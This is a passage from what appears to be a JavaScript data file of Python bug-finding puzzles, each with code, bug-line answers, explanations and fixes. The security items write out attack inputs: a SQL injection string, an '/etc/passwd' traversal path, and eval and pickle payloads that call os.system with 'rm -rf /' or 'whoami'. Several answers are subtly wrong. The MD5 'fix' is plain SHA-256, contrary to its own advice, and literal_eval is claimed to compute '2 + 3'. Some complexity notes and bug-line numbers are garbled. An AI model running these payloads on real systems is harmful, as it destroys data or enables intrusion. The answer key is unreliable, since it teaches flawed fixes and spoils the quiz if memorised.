    hasBugs: true
  },
{
    id: 39,
    title: "The Zip Length Mismatch",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your data pairing function uses zip() to combine two lists, but when the lists have different lengths, the extra elements are silently dropped. This causes data loss.",
    code: `def pair_data(names, scores):
    return list(zip(names, scores))

names = ["Alice", "Bob", "Carol"]
scores = [85, 90]
print(pair_data(names, scores))`,
    bugLines: [2],
    bugExplanations: {
      2: "zip() stops at the shortest iterable, silently dropping extra elements. Use zip_longest from itertools to include all elements with a fill value: from itertools import zip_longest; list(zip_longest(names, scores, fillvalue=0))."
    },
    hint: "zip() stops at the shortest list. How can you include all elements from the longer list?",
    hasBugs: true
  },
{
    id: 40,
    title: "The Mutable Default Dict",
    difficulty: "easy",
    category: "pitfall",
    type: "find",
    description: "Your grouping function uses a mutable default argument for the dictionary. This causes data to persist between function calls, leading to incorrect results.",
    code: `def group_items(items, groups={}):
    for item in items:
        key = item[0]
        if key not in groups:
            groups[key] = []
        groups[key].append(item)
    return groups

print(group_items(["apple", "apricot"]))  # a: [apple, apricot]
print(group_items(["banana"]))`,
    bugLines: [1],
    bugExplanations: {
      1: "Mutable default arguments are evaluated once at function definition. The same dictionary is reused across calls. Use groups=None and initialize inside the function: if groups is None: groups = {}."
    },
    hint: "Mutable default arguments persist between function calls. How should you handle this?",
    hasBugs: true
  },
{
    id: 41,
    title: "The Sort vs Sorted Confusion",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "Your function is supposed to return a sorted copy of a list but is returning None. The developer used list.sort() which sorts in-place and returns None, instead of sorted() which returns a new list.",
    code: `def get_sorted(data):
    # Return sorted copy
    return data.sort()

original = [3, 1, 2]
result = get_sorted(original)
print(result)`,
    bugLines: [3],
    bugExplanations: {
      3: "list.sort() sorts the list in-place and returns None. Use sorted(data) to return a new sorted list without modifying the original. Alternatively, make a copy first: data = sorted(data) or data_copy = data.copy(); data_copy.sort()."
    },
    hint: "sort() modifies in-place and returns None. sorted() returns a new list.",
    fixedCode: `def get_sorted(data):
    return sorted(data)

original = [3, 1, 2]
result = get_sorted(original)
print(result)`,
    expectedOutput: "[1, 2, 3]",
    hasBugs: true
  },
{
    id: 42,
    title: "The Index Out of Range",
    difficulty: "easy",
    category: "edge-case",
    type: "find",
    description: "Your function accesses the last element of a list using len()-1, but it crashes on empty lists. Use Python's negative indexing which is more elegant and safer.",
    code: `def get_last(items):
    return items[len(items) - 1]

print(get_last([1, 2, 3]))
print(get_last([]))`,
    bugLines: [2],
    bugExplanations: {
      2: "items[len(items) - 1] crashes on empty lists (len=0, index=-1 is invalid). Use items[-1] which is more Pythonic, but still crashes on empty lists. Better: check if items first, or use next(iter(items), default)."
    },
    hint: "What happens when you try to access index -1 of an empty list?",
    hasBugs: true
  },
{
    id: 43,
    title: "The Global Variable Misuse",
    difficulty: "easy",
    category: "pitfall",
    type: "fix",
    description: "Your counter function tries to increment a global variable but fails because the variable is not declared global in the function scope. This is a common scoping issue.",
    code: `count = 0

def increment():
    count += 1
    return count

print(increment())`,
    bugLines: [4],
    bugExplanations: {
      4: "Assigning to 'count' makes it a local variable, but it is referenced before assignment. Use 'global count' to declare it as global, or better yet, avoid global state and use a class or closure."
    },
    hint: "Python treats assigned variables as local by default. How do you modify a global variable?",
    fixedCode: `count = 0

def increment():
    global count
    count += 1
    return count

print(increment())`,
    expectedOutput: "1",
    hasBugs: true
  },
{
    id: 44,
    title: "The Type Checking Oversight",
    difficulty: "easy",
    category: "type",
    type: "find",
    description: "Your function checks if input is a list, but it rejects tuples which should also be valid. Use collections.abc.Sequence to check for sequence types more broadly.",
    code: `def process_sequence(data):
    if type(data) != list:
        raise TypeError("Expected list")
    return sum(data)

print(process_sequence((1, 2, 3)))`,
    bugLines: [2],
    bugExplanations: {
      2: "type(x) == list is too restrictive and doesn't allow subclasses or similar types like tuple. Use isinstance(data, (list, tuple)) or isinstance(data, collections.abc.Sequence) to be more flexible."
    },
    hint: "type() is too strict. isinstance() is more flexible for type checking.",
    hasBugs: true
  },
{
    id: 45,
    title: "The Break Missing in Loop",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your search function finds a match but continues iterating through the entire list unnecessarily. Add a break statement to stop once the match is found.",
    code: `def find_match(items, target):
    found = None
    for item in items:
        if item == target:
            found = item
    return found

# Test the function
result = find_match([1, 2, 3, 4, 5], 3)
print(result)`,
    bugLines: [5],
    bugExplanations: {
      5: "The loop continues checking all items even after finding a match. Add 'break' to exit the loop immediately: found = item; break. This is more efficient, especially for large lists."
    },
    hint: "Once you find what you are looking for, why keep searching?",
    fixedCode: `def find_match(items, target):
    found = None
    for item in items:
        if item == target:
            found = item
            break
    return found

# Test the function
result = find_match([1, 2, 3, 4, 5], 3)
print(result)`,
    expectedOutput: "3",
    hasBugs: true
  },
{
    id: 46,
    title: "The File Extension Extractor",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your file utility extracts extensions but fails on files without extensions or with multiple dots. The rsplit approach is safer than split for getting the extension.",
    code: `def get_extension(filename):
    parts = filename.split(".")
    return parts[1]

print(get_extension("document.pdf"))
print(get_extension("Makefile"))`,
    bugLines: [2, 3],
    bugExplanations: {
      2: "split('.') on a filename without a dot returns a single-element list.",
      3: "Accessing parts[1] fails when there's no extension. Use rsplit('.', 1) to split from the right, or better yet, use os.path.splitext() which handles edge cases properly."
    },
    hint: "What happens when a filename has no dot? Use rsplit or os.path.splitext.",
    hasBugs: true
  },
{
    id: 47,
    title: "The Set Discarding Issue",
    difficulty: "easy",
    category: "logic",
    type: "fix",
    description: "Your code removes items from a set but crashes when the item doesn't exist. Use the set method that doesn't raise an error for missing items.",
    code: `def remove_item(items, to_remove):
    for item in to_remove:
        items.remove(item)
    return items

items = {1, 2, 3}
print(remove_item(items, [2, 4]))`,
    bugLines: [3],
    bugExplanations: {
      3: "set.remove(x) raises KeyError if x is not in the set. Use set.discard(x) which silently does nothing if the item doesn't exist. This is safer when you're not sure if the item is present."
    },
    hint: "Sets have discard() which doesn't raise errors for missing items.",
    fixedCode: `def remove_item(items, to_remove):
    for item in to_remove:
        items.discard(item)
    return items

items = {1, 2, 3}
print(remove_item(items, [2, 4]))`,
    expectedOutput: "{1, 3}",
    hasBugs: true
  },
{
    id: 48,
    title: "The Any/All Confusion",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your validation function checks if all items pass a test but is using any() instead of all(). This causes validation to pass when only one item is valid instead of all items.",
    code: `def all_positive(numbers):
    # Check if all numbers are positive
    return any(n > 0 for n in numbers)

print(all_positive([1, -2, -3]))`,
    bugLines: [3],
    bugExplanations: {
      3: "any() returns True if at least one element is True. Use all() to check that ALL elements satisfy the condition: return all(n > 0 for n in numbers)."
    },
    hint: "any() = at least one. all() = every single one. Which do you need?",
    hasBugs: true
  },
{
    id: 49,
    title: "The String Formatting Bug",
    difficulty: "easy",
    category: "type",
    type: "fix",
    description: "Your logging function uses old-style % formatting but is missing the format specifier for a string value. This causes a TypeError.",
    code: `def log_message(user, action):
    return "User %s performed %s" % user

print(log_message("Alice", "login"))`,
    bugLines: [2],
    bugExplanations: {
      2: "The format string has two %s placeholders but only one value (user) is provided. Should be: \"User %s performed %s\" % (user, action). Or better yet, use f-strings: f\"User {user} performed {action}\"."
    },
    hint: "The number of format specifiers must match the number of values.",
    fixedCode: `def log_message(user, action):
    return "User %s performed %s" % (user, action)

print(log_message("Alice", "login"))`,
    expectedOutput: "User Alice performed login",
    hasBugs: true
  },
{
    id: 50,
    title: "The Boolean Return Bug",
    difficulty: "easy",
    category: "logic",
    type: "find",
    description: "Your function checks if a number is valid but returns the number itself instead of a boolean. This causes unexpected behavior in conditional statements.",
    code: `def is_valid_score(score):
    if 0 <= score <= 100:
        return score
    return False

if is_valid_score(50):  # 50 is truthy, works
    print("Valid")
if is_valid_score(0):
    print("Zero is valid too")`,
    bugLines: [4],
    bugExplanations: {
      4: "Returning 'score' instead of True means 0 (a valid score) is falsy and fails the if check. Always return explicit booleans: return True. This prevents subtle bugs with truthiness."
    },
    hint: "Functions that check validity should return explicit booleans, not the value.",
    hasBugs: true
  },
  // ==================== MEDIUM PROBLEMS (51-75) ====================
{
    id: 51,
    title: "The SQL Injection Vulnerability",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your user lookup function is vulnerable to SQL injection. An attacker could input admin' OR '1'='1 and bypass authentication entirely. This is a CRITICAL security vulnerability that has caused major data breaches at companies like Equifax and Yahoo. Never use string formatting for SQL queries.",
    code: `import sqlite3

def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Build query
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)`,
    bugLines: [6],
    bugExplanations: {
      6: "NEVER use f-strings or string formatting for SQL queries! This allows attackers to inject malicious SQL. An attacker can input: admin' OR '1'='1 to bypass authentication. Always use parameterized queries: cursor.execute('SELECT * FROM users WHERE username = ?', (username,)). This is how major data breaches happen."
    },
    hint: "String formatting in SQL queries is extremely dangerous. Use parameterized queries with placeholders.",
    hasBugs: true
  },
{
    id: 52,
    title: "The Hardcoded API Key",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "A developer hardcoded a production API key in the source code and pushed it to GitHub. Within hours, attackers found it using automated scanners and racked up $50,000 in API charges. Find the security violation and understand why secrets must never be in source code.",
    code: `import requests

API_KEY = "sk-live-1234567890abcdef"

def fetch_data():
    headers = {"Authorization": f"Bearer {API_KEY}"}
    return requests.get("https://api.example.com/data", headers=headers)`,
    bugLines: [3],
    bugExplanations: {
      3: "Hardcoded secrets in source code are a major security risk. Use environment variables: API_KEY = os.environ.get('API_KEY'). Also add secrets to .gitignore, use pre-commit hooks to scan for secrets, and use secret management tools like AWS Secrets Manager, HashiCorp Vault, or Doppler."
    },
    hint: "Secrets should never be in source code. Where should they be stored instead?",
    hasBugs: true
  },
{
    id: 53,
    title: "The Weak Password Hash",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your authentication system uses MD5 for password hashing. MD5 is cryptographically broken - rainbow tables can crack passwords in seconds. Modern GPUs can try billions of MD5 hashes per second. Upgrade to a proper password hashing algorithm designed for security.",
    code: `import hashlib

def hash_password(password):
    # Hash the password
    return hashlib.md5(password.encode()).hexdigest()

print(hash_password("secret123"))`,
    bugLines: [5],
    bugExplanations: {
      5: "MD5 is cryptographically broken and too fast for password hashing. Use bcrypt, argon2, or scrypt which are designed to be slow (computationally expensive) and include automatic salting to prevent rainbow table attacks. With MD5, attackers can crack millions of passwords per second on consumer hardware."
    },
    hint: "MD5 is not suitable for password hashing. What algorithms are designed for passwords?",
    fixedCode: `import hashlib

def hash_password(password):
    # Use SHA-256 instead of MD5
    return hashlib.sha256(password.encode()).hexdigest()

print(hash_password("secret123"))`,
    expectedOutput: "2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b",
    hasBugs: true
  },
{
    id: 54,
    title: "The Path Traversal Exploit",
    difficulty: "medium",
    category: "security",
    type: "find",
    description: "Your file server allows users to request files by name. An attacker discovered they can use '../../../etc/passwd' to read sensitive system files. This is a path traversal vulnerability that can expose your entire filesystem to attackers.",
    code: `def read_user_file(filename):
    path = f"/home/user/files/{filename}"
    with open(path, 'r') as f:
        return f.read()

read_user_file("../../../etc/passwd")`,
    bugLines: [2],
    bugExplanations: {
      2: "No validation of the filename allows directory traversal attacks. Use os.path.abspath(), check for '..' components, validate against an allowlist of permitted files, and ensure the resolved path is within the allowed directory. Never trust user input for filesystem operations."
    },
    hint: "User input should not directly construct file paths. How can you validate and sanitize paths?",
    hasBugs: true
  },
{
    id: 55,
    title: "The Eval Backdoor",
    difficulty: "medium",
    category: "security",
    type: "fix",
    description: "Your calculator app uses eval() to evaluate user expressions. An attacker discovered they can execute arbitrary Python code: __import__('os').system('rm -rf /'). This is a remote code execution vulnerability - the worst kind of security bug possible.",
    code: `def calculate(expression):
    return eval(expression)

# Test with a safe expression
result = calculate("2 + 3")
print(result)`,
    bugLines: [2],
    bugExplanations: {
      2: "eval() executes arbitrary Python code and should NEVER be used with untrusted input. Use ast.literal_eval() for literal values only, or implement a proper expression parser with a whitelist of allowed operations. This is how servers get compromised and data gets stolen."
    },
    hint: "eval() is dangerous with untrusted input. What safer alternatives exist?",
    fixedCode: `import ast

def calculate(expression):
    # Evaluate the expression safely
    return ast.literal_eval(expression)

# Test with a safe expression
result = calculate("2 + 3")
print(result)`,
    expectedOutput: "5",
    hasBugs: true
  },
{
    id: 56,
    title: "The O(n) Performance Trap",
    difficulty: "medium",
    category: "performance",
    type: "find",
    description: "Your duplicate detection algorithm works fine for 100 items but times out with 100,000 items. The nested loops create O(n) complexity. At scale, this algorithm would take hours to complete. Find the performance bottleneck and understand the power of sets.",
    code: `def has_duplicate(nums):
    for i in range(len(nums)):
        for j in range(i + 1, len(nums)):
            if nums[i] == nums[j]:
                return True
    return False`,
    bugLines: [2, 3, 4, 5],
    bugExplanations: {
      2: "Nested loops create O(n) time complexity.",
      3: "For 100,000 items, this does approximately 5 billion comparisons.",
      4: "Use a set for O(1) lookup instead of O(n) list scanning.",
      5: "Single pass solution: return len(nums) != len(set(nums)) - O(n) time"
    },
    hint: "There's a much faster way using a different data structure with O(1) lookup.",
    hasBugs: true
  },
{
    id: 57,
    title: "The String Concatenation Memory Hog",
    difficulty: "medium",
    category: "performance",
    type: "fix",
    description: "Your CSV generator builds large files by concatenating strings in a loop. With 1 million rows, memory usage explodes and the program slows to a crawl. Strings are immutable - each += creates a new copy of the entire string. Fix this memory inefficiency.",
    code: `def build_csv(rows):
    result = ""
    for row in rows:
        result += ",".join(row) + "\\n"
    return result

# Test
test_rows = [["name", "age"], ["Alice", "25"], ["Bob", "30"]]
print(build_csv(test_rows))`,
    bugLines: [4],
    bugExplanations: {
      4: "String concatenation in loops is O(n²) because strings are immutable. Each += creates a new string and copies all previous data. Use a list to accumulate lines, then join once at the end. For very large files, use io.StringIO or write directly to a file."
    },
    hint: "Strings are immutable - each += creates a new string. What data structure should you use instead?",
    fixedCode: `def build_csv(rows):
    lines = []
    for row in rows:
        lines.append(",".join(row))
    return "\\n".join(lines) + "\\n"

# Test
test_rows = [["name", "age"], ["Alice", "25"], ["Bob", "30"]]
print(build_csv(test_rows))`,
    expectedOutput: "name,age\nAlice,25\nBob,30\n",
    hasBugs: true
  },
{
    id: 58,
    title: "The Redundant Dictionary Lookup",
    difficulty: "medium",
    category: "performance",
    type: "find",
    description: "Your data processor performs the same dictionary lookup three times in a row. While not catastrophic, this is inefficient and un-Pythonic. Cache the lookup result in a variable to avoid redundant hash calculations.",
    code: `def process_data(data, key):
    if key in data:
        value = data[key]
        if data[key] > 0:
            return data[key] * 2`,
    bugLines: [4, 5],
    bugExplanations: {
      4: "You already have 'value' from line 3, use it instead of data[key] again.",
      5: "Same issue - use the cached 'value' variable. Multiple lookups waste CPU cycles."
    },
    hint: "Cache the lookup result in a variable. Why look up the same key multiple times?",
    hasBugs: true
  },
{
    id: 59,
    title: "The Connection Leak",
    difficulty: "medium",
    category: "performance",
    type: "fix",
    description: "Your database query function opens connections but doesn't close them. After a few hours in production, the database runs out of connection slots and rejects new requests. This is a resource leak that causes outages.",
    code: `# Simulated database query
def create_connection():
    return type('MockConn', (), {'cursor': lambda s: type('MockCursor', (), {'execute': lambda s, q: None, 'fetchall': lambda s: [(1, 'Alice'), (2, 'Bob')]})(), 'close': lambda s: None})()

def query_db(query):
    conn = create_connection()
    cursor = conn.cursor()
    cursor.execute(query)
    result = cursor.fetchall()
    return result

print(query_db("SELECT * FROM users"))`,
    bugLines: [9],
    bugExplanations: {
      9: "The connection is never closed, causing a resource leak. Use try/finally or a context manager to ensure cleanup happens even if exceptions occur. In production, this leads to 'too many connections' errors and service outages."
    },
    hint: "Resources should be released even if exceptions occur. What pattern ensures cleanup?",
    fixedCode: `# Simulated database query
def create_connection():
    return type('MockConn', (), {'cursor': lambda s: type('MockCursor', (), {'execute': lambda s, q: None, 'fetchall': lambda s: [(1, 'Alice'), (2, 'Bob')]})(), 'close': lambda s: None})()

def query_db(query):
    conn = create_connection()
    try:
        cursor = conn.cursor()
        cursor.execute(query)
        return cursor.fetchall()
    finally:
        conn.close()

print(query_db("SELECT * FROM users"))`,
    expectedOutput: "[(1, 'Alice'), (2, 'Bob')]",
    hasBugs: true
  },
{
    id: 60,
    title: "The Binary Search Infinite Loop",
    difficulty: "medium",
    category: "algorithm",
    type: "find",
    description: "Your binary search implementation has a bug that causes an infinite loop on certain inputs. When searching for an element larger than all array elements, left becomes equal to mid and the loop never terminates. This is a classic binary search bug.",
    code: `def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = (left + right) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid
        else:
            right = mid - 1
    return -1`,
    bugLines: [8],
    bugExplanations: {
      8: "Setting left = mid can cause infinite loop when target > arr[mid]. Should be left = mid + 1 to exclude the middle element already checked. This is the most common binary search bug."
    },
    hint: "When moving left bound, exclude the middle element already checked. Use mid + 1.",
    hasBugs: true
  },
{
    id: 61,
    title: "The Race Condition",
    difficulty: "medium",
    category: "concurrency",
    type: "find",
    description: "Your counter is incremented by multiple threads, but the operations are not atomic. Read-modify-write operations can interleave, causing lost updates. This is a classic race condition.",
    code: `from threading import Thread

counter = 0

def increment():
    global counter
    for _ in range(1000):
        counter += 1

threads = [Thread(target=increment) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()
print(counter)`,
    bugLines: [8],
    bugExplanations: {
      8: "counter += 1 is not atomic - it's read, modify, write. Multiple threads can read the same value, increment, and write back, losing updates. Use threading.Lock() or atomic operations to protect shared state."
    },
    hint: "counter += 1 is three operations: read, add, write. What happens when threads interleave?",
    hasBugs: true
  },
{
    id: 62,
    title: "The Deadlock Scenario",
    difficulty: "medium",
    category: "concurrency",
    type: "find",
    description: "Your multi-threaded code acquires locks in different orders, causing a deadlock. Thread A holds lock 1 and waits for lock 2, while Thread B holds lock 2 and waits for lock 1. Both threads wait forever.",
    code: `def transfer(account1, account2, amount):
    with account1.lock:
        with account2.lock:
            account1.balance -= amount
            account2.balance += amount`,
    bugLines: [3, 4],
    bugExplanations: {
      3: "Locks acquired in different orders by different threads cause deadlock.",
      4: "Always acquire locks in a consistent global order, or use a single lock for related resources."
    },
    hint: "Deadlock occurs when threads wait for each other's locks. How can you prevent this?",
    hasBugs: true
  },
{
    id: 63,
    title: "The Generator Exhaustion",
    difficulty: "medium",
    category: "logic",
    type: "find",
    description: "Your function uses a generator expression but tries to iterate over it twice. Generators can only be consumed once, so the second iteration yields nothing.",
    code: `def process_numbers(numbers):
    evens = (n for n in numbers if n % 2 == 0)
    first = list(evens)  # Consumes generator
    second = list(evens)
    return first, second`,
    bugLines: [3, 4],
    bugExplanations: {
      3: "Generator expressions can only be iterated once.",
      4: "Second iteration of exhausted generator yields nothing. Use a list comprehension if you need multiple iterations: evens = [n for n in numbers if n % 2 == 0]."
    },
    hint: "Generator expressions are single-use. If you need multiple iterations, what should you use?",
    hasBugs: true
  },
{
    id: 64,
    title: "The Context Manager Bug",
    difficulty: "medium",
    category: "pitfall",
    type: "find",
    description: "Your custom context manager doesn't handle exceptions properly. If an exception occurs, __exit__ is called but the exception is not properly suppressed or propagated.",
    code: `class DatabaseConnection:
    def __enter__(self):
        self.conn = create_connection()
        return self.conn
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()
        return True`,
    bugLines: [7],
    bugExplanations: {
      7: "Returning True from __exit__ suppresses ALL exceptions, hiding bugs! Only return True if you intentionally want to suppress specific exceptions. Usually, return False or None to let exceptions propagate."
    },
    hint: "__exit__ returning True suppresses exceptions. Is that what you want?",
    hasBugs: true
  },
{
    id: 65,
    title: "The Decorator Order Bug",
    difficulty: "medium",
    category: "logic",
    type: "find",
    description: "Your decorators are applied in the wrong order, causing unexpected behavior. Decorators are applied bottom-to-top, which can be counterintuitive.",
    code: `@authenticate  # Applied second
@cache_result  # Applied first
@log_calls      # Applied third
def get_user(user_id):
    return database.get_user(user_id)`,
    bugLines: [1, 2, 3],
    bugExplanations: {
      1: "Decorators are applied bottom-to-top.",
      2: "Current order: log_calls(cache_result(authenticate(get_user)))",
      3: "Usually you want: authenticate first, then cache, then log. Order matters!"
    },
    hint: "Decorators are applied bottom-to-top. Does this order make sense for your use case?",
    hasBugs: true
  },
{
    id: 66,
    title: "The Property Setter Bug",
    difficulty: "medium",
    category: "type",
    type: "fix",
    description: "Your property setter has infinite recursion because it assigns to itself instead of the private attribute. This causes RecursionError.",
    code: `class Temperature:
    def __init__(self, celsius):
        self._celsius = celsius
    
    @property
    def celsius(self):
        return self._celsius
    
    @celsius.setter
    def celsius(self, value):
        self.celsius = value`,
    bugLines: [10],
    bugExplanations: {
      10: "Assigning to self.celsius calls the setter again, causing infinite recursion. Use the private attribute: self._celsius = value."
    },
    hint: "The setter is called when you assign to the property. What attribute should you actually set?",
    hasBugs: true
  },
{
    id: 67,
    title: "The Metaclass Confusion",
    difficulty: "medium",
    category: "type",
    type: "find",
    description: "Your singleton implementation using __new__ doesn't actually enforce a single instance because __init__ is still called each time.",
    code: `class Singleton:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        self.value = 0`,
    bugLines: [8, 9],
    bugExplanations: {
      8: "__init__ is called every time Singleton() is invoked.",
      9: "This reinitializes the instance each time. Use a flag to track if already initialized, or use __call__ in a metaclass."
    },
    hint: "__new__ creates the instance, but __init__ is still called every time. How can you prevent re-initialization?",
    hasBugs: true
  },
{
    id: 68,
    title: "The Descriptor Protocol Bug",
    difficulty: "medium",
    category: "type",
    type: "fix",
    description: "Your descriptor doesn't distinguish between class and instance access, causing incorrect behavior when accessed via the class.",
    code: `class Validator:
    def __init__(self, min_value):
        self.min_value = min_value
    
    def __get__(self, instance, owner):
        return instance._value`,
    bugLines: [6],
    bugExplanations: {
      6: "When accessed via Class.attr, instance is None. Need to handle both cases: return self if instance is None else instance._value."
    },
    hint: "Descriptors receive None for instance when accessed via class. How should you handle this?",
    hasBugs: true
  },
{
    id: 69,
    title: "The MRO Diamond Problem",
    difficulty: "medium",
    category: "type",
    type: "find",
    description: "Your multiple inheritance hierarchy has a diamond shape, and method resolution order (MRO) may not be what you expect. Understand Python's C3 linearization.",
    code: `class A:
    def method(self):
        return "A"

class B(A):
    def method(self):
        return "B"

class C(A):
    def method(self):
        return "C"

class D(B, C):  # MRO: D -> B -> C -> A
    pass

d = D()
print(d.method())  # Which method is called?`,
    bugLines: [],
    bugExplanations: {},
    hint: "Python uses C3 linearization for MRO. Check D.__mro__ to see the order.",
    hasBugs: false
  },
{
    id: 70,
    title: "The Closure Late Binding",
    difficulty: "medium",
    category: "logic",
    type: "fix",
    description: "Your loop creates closures that all reference the same variable, which has the final value after the loop completes. This is Python's late binding behavior.",
    code: `def create_multipliers():
    return [lambda x: i * x for i in range(5)]

multipliers = create_multipliers()
print(multipliers[0](2))  # Expected: 0, Got: 8
print(multipliers[1](2))  # Expected: 2, Got: 8`,
    bugLines: [2],
    bugExplanations: {
      2: "All lambdas reference the same 'i' variable, which is 4 after the loop. Use a default argument to capture the current value: lambda x, i=i: i * x."
    },
    hint: "Closures capture variables, not values. How can you capture the current value of i?",
    fixedCode: `def create_multipliers():
    return [lambda x, i=i: i * x for i in range(5)]`,
    expectedOutput: "0\n2",
    hasBugs: true
  },
{
    id: 71,
    title: "The Import Circular Dependency",
    difficulty: "medium",
    category: "logic",
    type: "find",
    description: "Your modules have a circular import: A imports B, and B imports A. This can cause ImportError or partial module loading depending on import order.",
    code: `# module_a.py
from module_b import func_b

def func_a():
    return func_b()

# module_b.py
from module_a import func_a

def func_b():
    return "b"`,
    bugLines: [5],
    bugExplanations: {
      5: "Circular imports can cause ImportError. Solutions: 1) Refactor to remove the cycle, 2) Use local imports inside functions, 3) Merge modules, 4) Use dependency injection."
    },
    hint: "Circular imports are problematic. How can you break the cycle or defer the import?",
    hasBugs: true
  },
{
    id: 72,
    title: "The GIL Blocking Issue",
    difficulty: "medium",
    category: "concurrency",
    type: "find",
    description: "Your CPU-bound multi-threaded code doesn't get any speedup because of Python's Global Interpreter Lock (GIL). Only one thread executes Python bytecode at a time.",
    code: `from threading import Thread

def cpu_intensive():
    return sum(i * i for i in range(10000000))

threads = [Thread(target=cpu_intensive) for _ in range(4)]
for t in threads:
    t.start()
for t in threads:
    t.join()`,
    bugLines: [7, 8, 9],
    bugExplanations: {
      7: "Threads don't help for CPU-bound work due to GIL.",
      8: "Use multiprocessing for true parallelism.",
      9: "Or use concurrent.futures.ProcessPoolExecutor."
    },
    hint: "Python's GIL prevents true parallelism with threads. What should you use for CPU-bound tasks?",
    hasBugs: true
  },
{
    id: 73,
    title: "The Weak Reference Bug",
    difficulty: "medium",
    category: "type",
    type: "find",
    description: "Your cache uses weak references, but the objects are garbage collected immediately because no strong references exist. The cache is always empty.",
    code: `import weakref

class Cache:
    def __init__(self):
        self._data = weakref.WeakValueDictionary()
    
    def get(self, key):
        return self._data.get(key)
    
    def set(self, key, value):
        self._data[key] = value`,
    bugLines: [10],
    bugExplanations: {
      10: "Weak references don't prevent garbage collection. If no strong reference exists elsewhere, the object is collected immediately. Ensure strong references exist elsewhere, or use a regular dict with LRU eviction."
    },
    hint: "Weak references don't prevent garbage collection. When would the cached object be collected?",
    hasBugs: true
  },
{
    id: 74,
    title: "The Metaclass Conflict",
    difficulty: "medium",
    category: "type",
    type: "fix",
    description: "Your class inherits from two classes with different metaclasses, causing a TypeError. Python can't determine which metaclass to use.",
    code: `class MetaA(type):
    pass

class MetaB(type):
    pass

class A(metaclass=MetaA):
    pass

class B(metaclass=MetaB):
    pass

class C(A, B):
    pass`,
    bugLines: [12],
    bugExplanations: {
      12: "When mixing classes with different metaclasses, Python can't determine the resulting metaclass. Create a common metaclass that inherits from both: class CommonMeta(MetaA, MetaB): pass."
    },
    hint: "Python needs a single metaclass. How can you resolve the conflict?",
    hasBugs: true
  },
{
    id: 75,
    title: "The Async Await Bug",
    difficulty: "medium",
    category: "concurrency",
    type: "find",
    description: "Your async function calls a coroutine but doesn't await it, returning a coroutine object instead of the result. This is a common async/await mistake.",
    code: `import asyncio

async def fetch_data():
    await asyncio.sleep(1)
    return "data"

async def main():
    result = fetch_data()
    print(result)  # <coroutine object...>

asyncio.run(main())`,
    bugLines: [7],
    bugExplanations: {
      7: "Calling an async function without await returns a coroutine object, not the result. Use 'result = await fetch_data()' to actually execute the coroutine and get the return value."
    },
    hint: "Async functions return coroutine objects. What keyword actually executes them?",
    hasBugs: true
  },
  // ==================== HARD PROBLEMS (76-100) ====================
{
    id: 76,
    title: "The Timing Attack Vulnerability",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your password comparison function returns early when characters don't match. An attacker can measure response times to determine how many characters are correct, then brute-force one character at a time. This is a timing side-channel attack that has compromised real systems.",
    code: `def verify_password(stored, provided):
    if len(stored) != len(provided):
        return False
    for i in range(len(stored)):
        if stored[i] != provided[i]:
            return False
    return True`,
    bugLines: [5, 6],
    bugExplanations: {
      5: "Early return on mismatch means correct prefix takes longer to reject.",
      6: "Attackers measure response time to determine password length and characters. Use hmac.compare_digest() for constant-time comparison."
    },
    hint: "Different execution paths have different timings. How can you make comparison time constant?",
    hasBugs: true
  },
{
    id: 77,
    title: "The ReDoS Catastrophe",
    difficulty: "hard",
    category: "security",
    type: "fix",
    description: "Your email validation regex uses nested quantifiers (a+)* which causes catastrophic backtracking. An attacker can send a 100,000 character 'aaaa...' string and your server will hang for hours, CPU pegged at 100%. This is a Regular Expression Denial of Service (ReDoS) attack.",
    code: `import re

def validate_email(email):
    # Email validation pattern
    pattern = r'^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.com$'
    return re.match(pattern, email) is not None

# Test with long input: "a" * 100000 + "!"`,
    bugLines: [4],
    bugExplanations: {
      4: "Nested quantifiers (a+)* cause exponential backtracking. Use atomic groups, possessive quantifiers, or a simpler pattern. Or better yet, use a proper email validation library. This has caused production outages at major companies."
    },
    hint: "Nested quantifiers in regex can cause exponential time. How can you simplify the pattern?",
    fixedCode: `import re

def validate_email(email):
    # Simpler pattern without nested quantifiers
    pattern = r'^[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.com$'
    return re.match(pattern, email) is not None`,
    expectedOutput: "True/False",
    hasBugs: true
  },
{
    id: 78,
    title: "The Pickle Remote Code Execution",
    difficulty: "hard",
    category: "security",
    type: "find",
    description: "Your API accepts pickled data from users for caching. An attacker crafted a malicious pickle payload that executes arbitrary code when unpickled. They now have shell access to your server. Never unpickle untrusted data - this is equivalent to eval().",
    code: `import pickle

def load_cached_data(data):
    # Deserialize cached data
    return pickle.loads(data)

# Attacker's payload executes: __import__('os').system('whoami')`,
    bugLines: [4],
    bugExplanations: {
      4: "pickle.loads() is equivalent to eval() - it can execute arbitrary Python code. Never unpickle data from untrusted sources. Use JSON for data serialization, or if you must use pickle, sign/encrypt the data with a secret key."
    },
    hint: "Never unpickle untrusted data. What safe serialization formats can you use instead?",
    hasBugs: true
  },
{
    id: 79,
    title: "The Unbounded Cache Memory Leak",
    difficulty: "hard",
    category: "performance",
    type: "fix",
    description: "Your memoization decorator caches all function results without limit. After running for a week in production, your service runs out of memory and crashes. You need LRU eviction to limit cache size.",
    code: `def memoize(func):
    cache = {}
    def wrapper(*args):
        if args not in cache:
            cache[args] = func(*args)
        return cache[args]
    return wrapper

@memoize
def fib(n):
    if n < 2: return n
    return fib(n-1) + fib(n-2)

print(fib(10))`,
    bugLines: [2, 3, 4, 5, 6, 7],
    bugExplanations: {
      2: "Cache has no size limit",
